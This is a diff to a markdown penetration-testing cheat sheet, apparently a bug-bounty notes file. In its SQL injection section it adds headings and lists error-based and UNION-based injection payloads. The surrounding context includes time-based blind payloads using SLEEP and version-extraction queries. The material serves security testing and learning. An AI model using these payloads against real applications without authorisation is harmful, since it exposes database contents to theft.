@@ -1610,6 +1610,8 @@ You can find it here: [projectdiscovery/nuclei](https://github.com/projectdiscov
 
 ### <ins>SQL Injection</ins>
 
+#### <ins>Introduction</ins>
+
 **Tools**
 - [SQL injection cheat sheet  | PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 - [SQL Injection cheat sheets | pentestmonkey](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
@@ -1632,8 +1634,19 @@ You can find it here: [projectdiscovery/nuclei](https://github.com/projectdiscov
 - `SELECT * FROM tempdb.information_schema.tables;` inspect the available tables in the `tempdb` database
 - `SELECT * from tempdb.dbo.users;`
 
+#### <ins>Identification</ins>
+
 **How to identify SQL injections**
 - Search for SQL errors, use the apex or the backtick character in parameters and analyze the response.
+
+**Error-based payloads**
+- Try to generate an error using characters like `'` or the backtick
+- Try this payload `' OR 1=1 -- //`
+
+**UNION-based payloads**
+- `' ORDER BY 1-- //` Verify the exact number of columns
+- `' UNION SELECT database(), user(), @@version, null, null -- //` enumerate the database via SQL UNION Injection
+  - use `null` to have the correct number of columns
 
 **Blind SQL injections detection**
 - ```SQL
@@ -1645,6 +1658,8 @@ You can find it here: [projectdiscovery/nuclei](https://github.com/projectdiscov
 - ```SQL
   0'or(now()=sysdate()&&SLEEP(1))or'Z
   ```
+  
+#### <ins>Notes</ins>
 
 **Extract database information**
 - Extract the version: `?id=1 union all select 1, 2, @@version`
